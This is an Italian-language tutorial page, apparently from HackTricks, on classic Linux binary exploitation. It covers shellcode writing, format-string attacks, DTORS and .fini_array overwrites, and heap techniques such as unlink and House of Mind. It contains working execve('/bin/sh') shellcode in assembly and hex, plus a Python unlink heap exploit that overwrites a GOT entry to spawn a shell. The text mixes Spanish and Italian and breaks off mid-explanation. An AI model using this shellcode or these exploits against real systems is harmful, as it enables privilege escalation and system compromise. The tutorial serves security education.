# Linux Exploiting (Basic) (ITA)

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** ‚Äî> Nos devuelve un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Nos da un ejecutable formado por el c√≥digo ensamblador y podemos sacar los opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes

**Comprobar que la shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Per verificare che le system call vengano eseguite correttamente, √® necessario compilare il programma precedente e le system call devono apparire in **strace ./PROGRAMMA_COMPILATO**

Quando si creano shellcode, si pu√≤ utilizzare un trucco. La prima istruzione √® un salto a una chiamata. La chiamata richiama il codice originale e inserisce l'EIP nello stack. Dopo l'istruzione di chiamata, abbiamo inserito la stringa necessaria, quindi con quel EIP possiamo puntare alla stringa e continuare ad eseguire il codice.

ESEMPIO **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Esempio di utilizzo dello Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Cacciatore di Uova:**

Si tratta di un breve codice che esplora le pagine di memoria associate a un processo alla ricerca della shellcode ivi memorizzata (cercando una firma inserita nella shellcode). Utile nei casi in cui si dispone solo di uno spazio limitato per iniettare codice.

**Shellcode Polimorfiche**

Sono shell cifrate che contengono brevi codici che le decrittano e saltano ad esse, utilizzando il trucco di Call-Pop, questo sarebbe un **esempio di cifratura di Cesare**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Metodi complementari**

**Ret2Ret**

Utile quando non √® possibile inserire un indirizzo dello stack nell'EIP (verificare che l'EIP non contenga 0xbf) o quando non √® possibile calcolare la posizione della shellcode. Tuttavia, la funzione vulnerabile accetta un parametro (la shellcode andr√† qui).

In questo modo, cambiando l'EIP con un indirizzo a un **ret**, verr√† caricato il prossimo indirizzo (che √® l'indirizzo del primo argomento della funzione). In altre parole, verr√† caricata la shellcode.

L'exploit sarebbe: SHELLCODE + Riempimento (fino a EIP) + **\&ret** (i byte successivi nello stack puntano all'inizio della shellcode poich√© viene inserito nello stack l'indirizzo del parametro passato)

Sembra che funzioni come **strncpy** una volta completate eliminino dalla pila l'indirizzo in cui era memorizzata la shellcode, impedendo questa tecnica. In altre parole, l'indirizzo passato alla funzione come argomento (quello che memorizza la shellcode) viene modificato con un 0x00, quindi quando si chiama il secondo **ret** si trova un 0x00 e il programma si interrompe.

**Tecnica di Murat**

In Linux, tutti i programmi vengono mappati a partire da 0xbfffffff.

Guardando come viene costruito lo stack di un nuovo processo in Linux, √® possibile sviluppare un exploit in modo che il programma venga avviato in un ambiente in cui l'unica variabile sia la shellcode. L'indirizzo di questa pu√≤ quindi essere calcolato come: addr = 0xbfffffff - 4 - strlen(NOME\_eseguibile\_completo) - strlen(shellcode)

In questo modo si otterrebbe facilmente l'indirizzo in cui si trova la variabile di ambiente con la shellcode.

Questo √® possibile grazie alla funzione execle che consente di creare un ambiente con solo le variabili di ambiente desiderate.

**Jump to ESP: Stile Windows**

Poich√© l'ESP punta sempre all'inizio dello stack, questa tecnica consiste nel sostituire l'EIP con l'indirizzo di una chiamata a **jmp esp** o **call esp**. In questo modo, la shellcode viene salvata dopo la sovrascrittura dell'EIP poich√© dopo l'esecuzione del **ret**, l'ESP punter√† all'indirizzo successivo, proprio dove √® stata salvata la shellcode.

Nel caso in cui l'ASLR non sia attivo su Windows o Linux, √® possibile chiamare **jmp esp** o **call esp** memorizzate in qualche oggetto condiviso. Se l'ASLR √® attivo, potrebbe essere cercato all'interno del programma vulnerabile stesso.

Inoltre, il fatto di poter posizionare la shellcode dopo la corruzione dell'EIP anzich√© nel mezzo dello stack permette che le istruzioni push o pop eseguite nel mezzo della funzione non tocchino la shellcode (cosa che potrebbe accadere se fosse posizionata nel mezzo dello stack della funzione).

In modo molto simile a questo, se sappiamo che una funzione restituisce l'indirizzo in cui √® memorizzata la shellcode, √® possibile chiamare **call eax** o **jmp eax (ret2eax).**

**Integer overflows**

Questo tipo di overflow si verifica quando una variabile non √® pronta per gestire un numero cos√¨ grande come quello passato, possibilmente a causa di una confusione tra variabili con e senza segno, ad esempio:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Nell'esempio precedente vediamo che il programma si aspetta 2 parametri. Il primo √® la lunghezza della stringa successiva e il secondo √® la stringa.

Se passiamo un numero negativo come primo parametro, verr√† visualizzato che len < 256 e passeremo quel filtro, e inoltre anche strlen(buffer) sar√† minore di l, poich√© l √® unsigned int e sar√† molto grande.

Questo tipo di overflow non cerca di scrivere qualcosa nel processo del programma, ma di superare filtri mal progettati per sfruttare altre vulnerabilit√†.

**Variabili non inizializzate**

Non si conosce il valore che una variabile non inizializzata potrebbe assumere ed √® interessante osservarlo. Potrebbe assumere il valore che aveva una variabile della funzione precedente e questa potrebbe essere controllata dall'attaccante.

##

###

###

###

### **.fini\_array**

Essenzialmente si tratta di una struttura con **funzioni che verranno chiamate** prima che il programma finisca. Questo √® interessante se puoi chiamare il tuo **shellcode saltando a un indirizzo**, o nei casi in cui devi tornare di nuovo a main per **sfruttare la stringa di formato una seconda volta**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Nota che questo **non** creer√† un **loop eterno** perch√© quando torni a main il canary si accorger√†, la fine dello stack potrebbe essere corrotta e la funzione non verr√† richiamata di nuovo. Quindi con questo sarai in grado di **avere 1 esecuzione in pi√π** della vulnerabilit√†.

### **Formattare le stringhe per Dumpare il Contenuto**

Una stringa di formato pu√≤ anche essere abusata per **dumpare il contenuto** dalla memoria del programma.\
Ad esempio, nella seguente situazione c'√® una **variabile locale nello stack che punta a una flag**. Se **trovi** dove in **memoria** si trova il **puntatore** alla **flag**, puoi fare in modo che **printf acceda** a quell'**indirizzo** e stampi la **flag**:

Quindi, la flag √® in **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E dal leak puoi vedere che il **puntatore alla flag** √® nel **8¬∞** parametro:

![](<../../.gitbook/assets/image (623).png>)

Quindi, **accedendo** all'**8¬∞ parametro** puoi ottenere la flag:

![](<../../.gitbook/assets/image (624).png>)

Nota che seguendo l'**exploit precedente** e rendendoti conto che puoi **leakare il contenuto** puoi **impostare i puntatori** a **`printf`** nella sezione dove l'**eseguibile** √® **caricato** e **dumparlo** **interamente**!

### **DTOR**

{% hint style="danger" %}
Oggi √® molto **strano trovare un binario con una sezione dtor**.
{% endhint %}

I distruttori sono funzioni che vengono **eseguite prima che il programma finisca**.\
Se riesci a **scrivere** un **indirizzo** a uno **shellcode** in **`__DTOR_END__`**, questo verr√† **eseguito** prima che il programma finisca.\
Ottieni l'indirizzo di questa sezione con:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Di solito troverai la sezione **DTOR** **tra** i valori `ffffffff` e `00000000`. Quindi se vedi solo quei valori, significa che **non c'√® alcuna funzione registrata**. Quindi **sovrascrivi** il **`00000000`** con l'**indirizzo** dello **shellcode** per eseguirlo.

### **Stringhe di Formato per Buffer Overflows**

La funzione **sprintf** sposta una stringa formattata in una **variabile**. Quindi potresti abusare della **formattazione** di una stringa per causare un **buffer overflow nella variabile** in cui il contenuto viene copiato.\
Ad esempio, il payload `%.44xAAAA` scriver√† 44B+"AAAA" nella variabile, il che potrebbe causare un buffer overflow.

### **Strutture \_\_atexit**

{% hint style="danger" %}
Oggi √® molto **strano sfruttare questo**.
{% endhint %}

**`atexit()`** √® una funzione a cui vengono passate **altre funzioni come parametri**. Queste **funzioni** verranno **eseguite** durante l'esecuzione di un **`exit()`** o al **ritorno** dal **main**.\
Se riesci a **modificare** l'**indirizzo** di una qualsiasi di queste **funzioni** in modo che punti a uno shellcode, ad esempio, otterrai il **controllo** del **processo**, ma attualmente √® pi√π complicato.\
Attualmente gli **indirizzi delle funzioni** da eseguire sono **nascosti** dietro diverse strutture e infine l'indirizzo a cui puntano non sono gli indirizzi delle funzioni, ma sono **criptati con XOR** e spostamenti con una **chiave casuale**. Quindi attualmente questo vettore di attacco non √® molto utile almeno su x86 e x64\_86.\
La funzione di **criptazione** √® **`PTR_MANGLE`**. Altre architetture come m68k, mips32, mips64, aarch64, arm, hppa... **non implementano la funzione di crittografia** perch√© **restituisce lo stesso** che ha ricevuto in input. Quindi queste architetture potrebbero essere attaccabili tramite questo vettore.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Oggi √® molto **strano sfruttare questo**.
{% endhint %}

**`Setjmp()`** consente di **salvare** il **contesto** (i registri)\
**`longjmp()`** consente di **ripristinare** il **contesto**.\
I **registri salvati** sono: `EBX, ESI, EDI, ESP, EIP, EBP`\
Quello che succede √® che EIP e ESP vengono passati dalla funzione **`PTR_MANGLE`**, quindi le **architetture vulnerabili a questo attacco sono le stesse di prima**.\
Sono utili per il recupero degli errori o per gli interrupt.\
Tuttavia, da quanto ho letto, gli altri registri non sono protetti, **quindi se c'√® una `call ebx`, `call esi` o `call edi`** all'interno della funzione chiamata, √® possibile prendere il controllo. Oppure potresti anche modificare EBP per modificare ESP.

**VTable e VPTR in C++**

Ogni classe ha una **Vtable** che √® un array di **puntatori a metodi**.

Ogni oggetto di una **classe** ha un **VPtr** che √® un **puntatore** all'array della sua classe. Il VPtr fa parte dell'intestazione di ogni oggetto, quindi se si riesce a **sovrascrivere** il **VPtr** potrebbe essere **modificato** per **puntare** a un metodo fittizio in modo che l'esecuzione di una funzione vada allo shellcode.

## **Misure Preventive ed Evasioni**

###

**Sostituzione di Libsafe**

Si attiva con: LD\_PRELOAD=/lib/libsafe.so.2\
o\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Le chiamate a alcune funzioni non sicure vengono intercettate e sostituite con altre sicure. Non standardizzato. (solo per x86, non per compilazioni con -fomit-frame-pointer, non compilazioni statiche, non tutte le funzioni vulnerabili diventano sicure e LD\_PRELOAD non funziona con binari con setuid).

**Spazio degli Indirizzi ASCII Armored**

Consiste nel caricare le librerie condivise da 0x00000000 a 0x00ffffff in modo che ci sia sempre un byte 0x00. Tuttavia, questo non ferma praticamente nessun attacco, specialmente in little endian.

**ret2plt**

Consiste nell'eseguire un ROP in modo che si chiami la funzione strcpy@plt (dalla plt) e si punti all'ingresso della GOT e si copi il primo byte della funzione che si vuole chiamare (system()). Successivamente si fa lo stesso puntando a GOT+1 e si copia il secondo byte di system()... Alla fine si chiama l'indirizzo salvato nella GOT che sar√† system()

**Jail con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installa un sistema di base in una directory specifica

Un amministratore pu√≤ uscire da una di queste prigioni facendo: mkdir foo; chroot foo; cd ..

**Strumentazione del Codice**

Valgrind ‚Äî> Cerca errori\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits di Base**

**Chunk Assegnato**

prev\_size |\
size | ‚ÄîHeader\
\*mem | Dati

**Chunk Libero**

prev\_size |\
size |\
\*fd | Ptr chunk successivo\
\*bk | Ptr chunk precedente ‚ÄîHeader\
\*mem | Dati

I chunk liberi sono in una lista doppiamente collegata (bin) e non possono mai essere due chunk liberi consecutivi (vengono uniti)

In "size" ci sono bit per indicare: se il chunk precedente √® in uso, se il chunk √® stato assegnato tramite mmap() e se il chunk appartiene all'arena primaria.

Quando viene liberato un chunk e uno dei chunk adiacenti √® libero, questi vengono fusi tramite la macro unlink() e il nuovo chunk pi√π grande viene passato a frontlink() per inserirlo nel bin appropriato.

unlink(){\
BK = P->bk; ‚Äî> Il BK del nuovo chunk √® quello che aveva il chunk precedentemente libero\
FD = P->fd; ‚Äî> Il FD del nuovo chunk √® quello che aveva il chunk precedentemente libero\
FD->bk = BK; ‚Äî> Il BK del chunk successivo punta al nuovo chunk\
BK->fd = FD; ‚Äî> Il FD del chunk precedente punta al nuovo chunk\
}

Pertanto, se riusciamo a modificare P->bk con l'indirizzo di uno shellcode e P->fd con l'indirizzo di un'entrata nella GOT o DTORS meno 12, si ottiene:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E cos√¨, al termine del programma, lo shellcode viene eseguito.

Inoltre, la quarta istruzione di unlink() scrive qualcosa e lo shellcode deve essere preparato per questo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Questo provoca la scrittura di 4 byte a partire dall'8¬∞ byte dello shellcode, quindi la prima istruzione dello shellcode deve essere un jmp per saltare questo e passare a una serie di nop che portino al resto dello shellcode.

Pertanto, l'exploit viene creato:

Nel buffer1 inseriamo lo shellcode iniziando con un jmp in modo che cada nei nop o nel resto dello shellcode.

Dopo lo shellcode inseriamo del padding fino a raggiungere il campo prev\_size e size del chunk successivo. In questi punti inseriamo 0xfffffff0 (per sovrascrivere prev\_size in modo che abbia il bit che indica che √® libero) e "-4" (0xfffffffc) in size (per far credere al terzo chunk che il secondo sia libero quando in realt√† va al prev\_size modificato che dir√† che √® libero) -> Quindi quando free() controlla, va al size del terzo ma in realt√† va al secondo - 4 e pensa che il secondo chunk sia libero. E quindi chiama **unlink()**.

Chiamando unlink() user√† i primi dati del secondo chunk come P->fd, quindi l√¨ verr√† inserito l'indirizzo da sovrascrivere - 12 (poich√© in FD->bk verr√† aggiunto 12 all'indirizzo memorizzato in FD). E in quell'indirizzo verr√† inserito il secondo indirizzo trovato nel secondo chunk, che ci interesser√† che sia l'indirizzo dello shellcode (falso P->bk).
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes di riempimento**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #√à importante che il bit che indica che il chunk precedente √® libero sia impostato su 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, in modo che pensi che il "size" del 3¬∫ chunk sia 4 byte indietro (punta a prev\_size) dove controlla se il 2¬∫ chunk √® libero**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Nel payload all'inizio aggiungiamo 8 byte di riempimento**

**got\_free = pack("\<I", 0x08048300 - 12) #Indirizzo di free() nella plt-12 (sar√† sovrascritto per eseguire la shellcode la seconda volta che viene chiamato free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Come detto, il payload inizia con 8 byte di riempimento per convenienza**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modifichiamo il 2¬∫ chunk, got\_free punta dove salveremo l'indirizzo addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() rilasciando in ordine inverso (wargame)**

Stiamo controllando 3 chunk consecutivi e vengono rilasciati in ordine inverso rispetto alla loro allocazione.

In questo caso:

Nel chunk c inseriamo la shellcode

Utilizziamo il chunk a per sovrascrivere il b in modo che il bit PREV\_INUSE del size sia disattivato, facendo credere che il chunk a sia libero.

Inoltre, sovrascriamo il size nell'header di b in modo che valga -4.

Cos√¨, il programma penser√† che "a" sia libero e in un bin, quindi chiamer√† unlink() per disconnetterlo. Tuttavia, poich√© l'header PREV\_SIZE vale -4, penser√† che il chunk "a" inizi effettivamente in b+4. In altre parole, eseguir√† un unlink() su un chunk che inizia in b+4, quindi in b+12 ci sar√† il puntatore "fd" e in b+16 ci sar√† il puntatore "bk".

In questo modo, se mettiamo l'indirizzo della shellcode in bk e l'indirizzo della funzione "puts()" -12 in fd, otteniamo il nostro payload.

**Tecnica di Frontlink**

Frontlink viene chiamato quando viene rilasciato un chunk e nessuno dei suoi chunk adiacenti √® libero, non viene chiamato unlink() ma viene chiamato direttamente frontlink().

Vulnerabilit√† utile quando il malloc attaccato non viene mai liberato (free()).

Richiede:

Un buffer che pu√≤ essere sovrascritto con la funzione di input dei dati

Un buffer adiacente a questo che deve essere liberato e il cui campo fd dell'header verr√† modificato grazie al buffer precedente

Un buffer da liberare con una dimensione maggiore di 512 ma inferiore al buffer precedente

Un buffer dichiarato prima del passaggio 3 che consente di sovrascrivere il prev\_size di questo

In questo modo, sovrascrivendo due malloc in modo incontrollato e uno in modo controllato ma liberando solo quest'ultimo, possiamo creare un exploit.

**Vulnerabilit√† double free()**

Se free() viene chiamato due volte con lo stesso puntatore, ci saranno due bin che puntano allo stesso indirizzo.

Se si desidera riutilizzarne uno, non ci sono problemi. Se si desidera utilizzarne un altro, verr√† assegnato lo stesso spazio, quindi avremo i puntatori "fd" e "bk" falsificati con i dati scritti dalla prenotazione precedente.

**After free()**

Un puntatore precedentemente liberato viene riutilizzato senza controllo.

## **8 Heap Overflows: Exploits avanzati**

Le tecniche di Unlink() e FrontLink() sono state eliminate modificando la funzione unlink().

**The house of mind**

√à necessaria solo una chiamata a free() per eseguire del codice arbitrario. √à importante trovare un secondo chunk che pu√≤ essere sovrascritto da uno precedente e liberato.

Una chiamata a free() comporta una chiamata a public\_fREe(mem), che fa:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Restituisce un puntatore all'indirizzo in cui inizia il chunk (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

In \[1] controlla il campo size del bit NON\_MAIN\_ARENA, che pu√≤ essere alterato in modo che il controllo restituisca true ed esegua heap\_for\_ptr() che effettua un and a "mem" azzerando i 2,5 byte meno significativi (nel nostro caso da 0x0804a000 a 0x08000000) e accede a 0x08000000->ar\_ptr (come se fosse una struct heap\_info)

In questo modo, se possiamo controllare un chunk ad esempio in 0x0804a000 e verr√† liberato un chunk in **0x081002a0** possiamo raggiungere l'indirizzo 0x08100000 e scrivere ci√≤ che vogliamo, ad esempio **0x0804a000**. Quando verr√† liberato questo secondo chunk, trover√† che heap\_for\_ptr(ptr)->ar\_ptr restituir√† ci√≤ che abbiamo scritto in 0x08100000 (poich√© si applica a 0x081002a0 l'and che abbiamo visto prima e da l√¨ si ottiene il valore dei primi 4 byte, ar\_ptr)

Quindi viene chiamato \_int\_free(ar\_ptr, mem), cio√® **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Come abbiamo visto prima, possiamo controllare il valore di av, poich√© √® ci√≤ che scriviamo nel chunk che verr√† liberato.

Come √® definito unsorted\_chunks, sappiamo che:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Pertanto, se scriviamo il valore di \_\_DTOR\_END\_\_-12 in av->bins\[2], nell'ultima istruzione verr√† scritto in \_\_DTOR\_END\_\_ l'indirizzo del secondo chunk.

In altre parole, nel primo chunk dobbiamo inserire all'inizio molte volte l'indirizzo di \_\_DTOR\_END\_\_-12 perch√© av->bins\[2\] lo prender√† da l√¨

Nell'indirizzo in cui cade l'indirizzo del secondo chunk con gli ultimi 5 zeri, dobbiamo scrivere l'indirizzo di questo primo chunk in modo che heap\_for\_ptr() pensi che ar\_ptr sia all'inizio del primo chunk e prenda av->bins\[2\]

Nel secondo chunk e grazie al primo sovrascriviamo il prev\_size con un salto 0x0c e il size con qualcosa per attivare -> NON\_MAIN\_ARENA

Successivamente, nel chunk 2 inseriamo molti nops e infine la shellcode

In questo modo verr√† chiamato \_int\_free(CHUNK1, CHUNK2) e seguir√† le istruzioni per scrivere in \_\_DTOR\_END\_\_ l'indirizzo del prev\_size del CHUNK2 che salter√† alla shellcode.
Per applicare questa tecnica sono necessari alcuni requisiti che complicano un po' il payload.

Questa tecnica non √® pi√π applicabile poich√© √® stato applicato quasi lo stesso patch di unlink. Si confrontano se il nuovo sito a cui si punta sta puntando anche a lui.

**Fastbin**

√à una variante di The house of mind

ci interessa eseguire il codice successivo che si raggiunge dopo la prima verifica della funzione \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Essendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

In questo modo, se viene messo in "fb" d√† l'indirizzo di una funzione nella GOT, in questo indirizzo verr√† messo l'indirizzo del pezzo sovrascritto. Per fare ci√≤ sar√† necessario che l'arena sia vicina agli indirizzi di dtors. Pi√π precisamente, av->max\_fast deve essere all'indirizzo che stiamo sovrascrivendo.

Poich√© con The House of Mind abbiamo visto che controllavamo la posizione di av.

Quindi se nel campo size viene inserita una dimensione di 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() restituir√† fastbins\[-1\], che punter√† a av->max\_fast

In questo caso av->max\_fast sar√† l'indirizzo sovrascritto (non a cui punta, ma quella posizione sar√† sovrascritta).

Inoltre, deve essere soddisfatto che il pezzo adiacente a quello liberato deve essere maggiore di 8 -> Dato che abbiamo detto che la dimensione del pezzo liberato √® 8, in questo falso pezzo dobbiamo solo mettere una dimensione maggiore di 8 (inoltre, poich√© la shellcode sar√† nel pezzo liberato, all'inizio dovremo mettere un jmp che cade in nops).

Inoltre, lo stesso falso pezzo deve essere minore di av->system\_mem. av->system\_mem si trova a 1848 byte di distanza.

A causa dei nulli di \_DTOR\_END\_ e delle poche direzioni nella GOT, nessuna direzione di queste sezioni √® adatta per essere sovrascritta, quindi vediamo come applicare fastbin per attaccare lo stack.

Un altro modo per attaccare √® di reindirizzare il **av** verso lo stack.

Se modifichiamo la dimensione in modo che sia 16 invece di 8 allora: fastbin\_index() restituir√† fastbins\[0\] e possiamo fare uso di questo per sovrascrivere lo stack.

Per fare ci√≤ non deve esserci alcun canary o valori strani nello stack, infatti dobbiamo trovarci in questo: 4byte nulli + EBP + RET

I 4 byte nulli sono necessari affinch√© il **av** sia a questo indirizzo e il primo elemento di un **av** √® il mutex che deve valere 0.

Il **av->max\_fast** sar√† l'EBP e sar√† un valore che ci permetter√† di saltare le restrizioni.

Nel **av->fastbins\[0\]** verr√† sovrascritto con l'indirizzo di **p** e sar√† il RET, in questo modo si salter√† alla shellcode.

Inoltre, in **av->system\_mem** (1484 byte sopra la posizione nello stack) ci sar√† abbastanza spazzatura che ci permetter√† di saltare il controllo che viene eseguito.

Inoltre, deve essere soddisfatto che il pezzo adiacente a quello liberato deve essere maggiore di 8 -> Dato che abbiamo detto che la dimensione del pezzo liberato √® 16, in questo falso pezzo dobbiamo solo mettere una dimensione maggiore di 8 (inoltre, poich√© la shellcode sar√† nel pezzo liberato, all'inizio dovremo mettere un jmp che cade in nops che vanno dopo il campo size del nuovo falso pezzo).

**The House of Spirit**

In questo caso cerchiamo di avere un puntatore a un malloc che possa essere modificato dall'attaccante (ad esempio, che il puntatore sia nello stack sotto un possibile overflow a una variabile).

In questo modo, potremmo fare in modo che questo puntatore punti ovunque. Tuttavia, non qualsiasi posizione √® valida, la dimensione del pezzo falso deve essere minore di av->max\_fast e pi√π specificamente uguale alla dimensione richiesta in una futura chiamata a malloc()+8. Pertanto, se sappiamo che dopo questo puntatore vulnerabile viene chiamato malloc(40), la dimensione del pezzo falso deve essere uguale a 48.

Se ad esempio il programma chiedesse all'utente un numero potremmo inserire 48 e puntare il puntatore di malloc modificabile ai successivi 4 byte (che potrebbero appartenere all'EBP con fortuna, cos√¨ il 48 rimane dietro, come se fosse l'intestazione size). Inoltre, l'indirizzo ptr-4+48 deve soddisfare diverse condizioni (essendo in questo caso ptr=EBP), cio√®, 8 < ptr-4+48 < av->system\_mem.

Nel caso in cui ci√≤ si verifichi, quando viene chiamato il successivo malloc che abbiamo detto essere malloc(40), verr√† assegnato come indirizzo l'indirizzo dell'EBP. Nel caso in cui l'attaccante possa anche controllare ci√≤ che viene scritto in questo malloc, pu√≤ sovrascrivere sia l'EBP che l'EIP con l'indirizzo desiderato.

Penso che ci√≤ sia dovuto al fatto che quando viene liberato free() memorizzer√† che nell'indirizzo che punta all'EBP dello stack c'√® un pezzo di dimensioni perfette per il nuovo malloc() che si desidera riservare, quindi assegner√† quell'indirizzo.

**The House of Force**

√à necessario:

* Un overflow a un pezzo che permetta di sovrascrivere il wilderness
* Una chiamata a malloc() con la dimensione definita dall'utente
* Una chiamata a malloc() i cui dati possono essere definiti dall'utente

La prima cosa da fare √® sovrascrivere la dimensione del pezzo wilderness con un valore molto grande (0xffffffff), quindi qualsiasi richiesta di memoria sufficientemente grande verr√† gestita in \_int\_malloc() senza la necessit√† di espandere l'heap

La seconda √® modificare av->top in modo che punti a una zona di memoria sotto il controllo dell'attaccante, come lo stack. In av->top verr√† messo \&EIP - 8.

Dobbiamo sovrascrivere av->top in modo che punti alla zona di memoria sotto il controllo dell'attaccante:

vittima = av->top;

resto = chunck\_at\_offset(vittima, nb);

av->top = resto;

